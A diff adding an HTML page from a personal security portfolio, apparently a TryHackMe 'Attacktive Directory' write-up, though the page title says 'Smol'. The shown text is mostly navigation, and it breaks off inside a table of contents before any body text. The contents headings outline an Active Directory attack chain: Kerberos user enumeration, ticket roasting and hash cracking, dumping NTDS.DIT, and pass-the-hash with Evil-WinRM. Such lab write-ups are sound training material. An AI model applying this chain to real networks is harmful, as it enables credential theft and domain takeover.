@@ -1,0 +1,1765 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://ZouCherif.github.io/portfolio/CTF/attacktive-directory/">
+      
+      
+        <link rel="prev" href="../JacobTheBoss/">
+      
+      
+        <link rel="next" href="../../Projects/01-deploiement-siem-wazuh/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>TryHackMe: Smol - Portfolio - Cherif Zouaoui</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tryhackme-smol" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Portfolio - Cherif Zouaoui" class="md-header__button md-logo" aria-label="Portfolio - Cherif Zouaoui" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Portfolio - Cherif Zouaoui
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              TryHackMe: Smol
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="cyan"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Welcome to portfolio
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../CMSpit/" class="md-tabs__link">
+          
+  
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Projects/01-deploiement-siem-wazuh/" class="md-tabs__link">
+          
+  
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Portfolio - Cherif Zouaoui" class="md-nav__button md-logo" aria-label="Portfolio - Cherif Zouaoui" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Portfolio - Cherif Zouaoui
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to portfolio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CMSpit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe: CMSpit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JacobTheBoss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🚩 Audit Report: Jacob the Boss
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe: Smol
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe: Smol
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-challenge-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Challenge Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-what-tool-will-allow-us-to-enumerate-port-139445" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1. What tool will allow us to enumerate port 139/445?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-what-is-the-netbios-domain-name-of-the-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2. What is the NetBIOS-Domain Name of the machine?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-what-invalid-tld-top-level-domain-do-people-commonly-use-for-their-active-directory-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3. What invalid TLD (Top-Level Domain) do people commonly use for their Active Directory Domain?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-enumerating-users-using-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Enumerating Users using Kerberos
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Enumerating Users using Kerberos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-what-command-within-kerbrute-will-allow-us-to-enumerate-valid-usernames" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1. What command within Kerbrute will allow us to enumerate valid usernames?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-what-notable-account-is-discovered-these-should-jump-out-at-you" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2. What notable account is discovered? (These should jump out at you)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-what-is-the-other-notable-account-is-discovered-these-should-jump-out-at-you" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3. What is the other notable account is discovered? (These should jump out at you)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-abusing-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Abusing Kerberos
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Abusing Kerberos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-we-have-two-user-accounts-that-we-could-potentially-query-a-ticket-from-which-user-account-can-you-query-a-ticket-from-with-no-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-looking-at-the-hashcat-examples-wiki-page-what-type-of-kerberos-hash-did-we-retrieve-from-the-kdc-specify-the-full-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-what-mode-is-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3. What mode is the hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-now-crack-the-hash-with-the-modified-password-list-provided-what-is-the-user-accounts-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4. Now crack the hash with the modified password list provided, what is the user accounts password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-back-to-the-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Back to the basics
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Back to the basics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-what-utility-can-we-use-to-map-remote-smb-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1. What utility can we use to map remote SMB shares?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-which-option-will-list-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2. Which option will list shares?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-how-many-remote-shares-is-the-server-listing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3. How many remote shares is the server listing?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64-there-is-one-particular-share-that-we-have-access-to-that-contains-a-text-file-which-share-is-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.4. There is one particular share that we have access to that contains a text file. Which share is it?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#65-what-is-the-content-of-the-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.5. What is the content of the file?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#66-decoding-the-contents-of-the-file-what-is-the-full-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.6. Decoding the contents of the file, what is the full contents?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-elevating-privileges-within-the-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Elevating privileges within the domain
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Elevating privileges within the domain">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-what-method-allowed-us-to-dump-ntdsdit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.1. What method allowed us to dump NTDS.DIT?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-what-is-the-administrators-ntlm-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.2. What is the Administrators NTLM hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-what-method-of-attack-could-allow-us-to-authenticate-as-the-user-without-the-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.3. What method of attack could allow us to authenticate as the user without the password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74-using-a-tool-called-evil-winrm-what-option-will-allow-us-to-use-a-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.4. Using a tool called Evil-WinRM what option will allow us to use a hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-flag-submission-panel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Flag Submission Panel
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Flag Submission Panel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#submit-the-flags-for-each-user-account-they-can-be-located-on-each-users-desktop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Submit the flags for each user account. They can be located on each user's desktop.
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Submit the flags for each user account. They can be located on each user&#39;s desktop.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#svc-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        svc-admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        backup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Administrator
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Projects
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Projects
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Projects/01-deploiement-siem-wazuh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hybrid SOC Deployment &amp; Threat Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-challenge-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Challenge Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-what-tool-will-allow-us-to-enumerate-port-139445" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1. What tool will allow us to enumerate port 139/445?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-what-is-the-netbios-domain-name-of-the-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2. What is the NetBIOS-Domain Name of the machine?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-what-invalid-tld-top-level-domain-do-people-commonly-use-for-their-active-directory-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3. What invalid TLD (Top-Level Domain) do people commonly use for their Active Directory Domain?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-enumerating-users-using-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Enumerating Users using Kerberos
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Enumerating Users using Kerberos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-what-command-within-kerbrute-will-allow-us-to-enumerate-valid-usernames" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1. What command within Kerbrute will allow us to enumerate valid usernames?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-what-notable-account-is-discovered-these-should-jump-out-at-you" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2. What notable account is discovered? (These should jump out at you)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-what-is-the-other-notable-account-is-discovered-these-should-jump-out-at-you" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3. What is the other notable account is discovered? (These should jump out at you)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-abusing-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Abusing Kerberos
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Abusing Kerberos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-we-have-two-user-accounts-that-we-could-potentially-query-a-ticket-from-which-user-account-can-you-query-a-ticket-from-with-no-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-looking-at-the-hashcat-examples-wiki-page-what-type-of-kerberos-hash-did-we-retrieve-from-the-kdc-specify-the-full-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-what-mode-is-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3. What mode is the hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-now-crack-the-hash-with-the-modified-password-list-provided-what-is-the-user-accounts-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4. Now crack the hash with the modified password list provided, what is the user accounts password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-back-to-the-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Back to the basics
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Back to the basics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-what-utility-can-we-use-to-map-remote-smb-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1. What utility can we use to map remote SMB shares?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-which-option-will-list-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2. Which option will list shares?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-how-many-remote-shares-is-the-server-listing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3. How many remote shares is the server listing?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64-there-is-one-particular-share-that-we-have-access-to-that-contains-a-text-file-which-share-is-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.4. There is one particular share that we have access to that contains a text file. Which share is it?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#65-what-is-the-content-of-the-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.5. What is the content of the file?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#66-decoding-the-contents-of-the-file-what-is-the-full-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.6. Decoding the contents of the file, what is the full contents?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-elevating-privileges-within-the-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Elevating privileges within the domain
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Elevating privileges within the domain">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-what-method-allowed-us-to-dump-ntdsdit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.1. What method allowed us to dump NTDS.DIT?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-what-is-the-administrators-ntlm-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.2. What is the Administrators NTLM hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-what-method-of-attack-could-allow-us-to-authenticate-as-the-user-without-the-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.3. What method of attack could allow us to authenticate as the user without the password?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74-using-a-tool-called-evil-winrm-what-option-will-allow-us-to-use-a-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.4. Using a tool called Evil-WinRM what option will allow us to use a hash?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-flag-submission-panel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Flag Submission Panel
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Flag Submission Panel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#submit-the-flags-for-each-user-account-they-can-be-located-on-each-users-desktop" class="md-nav__link">
